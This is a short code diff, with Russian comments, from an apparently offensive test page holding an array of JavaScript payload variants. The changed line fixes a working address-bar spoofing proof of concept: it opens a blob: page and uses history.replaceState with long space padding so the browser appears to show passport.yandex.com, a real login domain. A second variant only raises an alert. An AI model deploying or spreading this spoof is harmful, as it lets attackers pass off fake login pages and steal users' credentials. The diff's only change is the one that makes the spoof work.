@@ -30,7 +30,7 @@
 <script>
 // Сами варианты:
 const variants = [
-`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","b:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
+`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","blob:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
 
 `var exp = "<html><body><h1>ALERT TEST</h1><script>alert('Это вариант 2!');<\/script></body></html>";\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
 
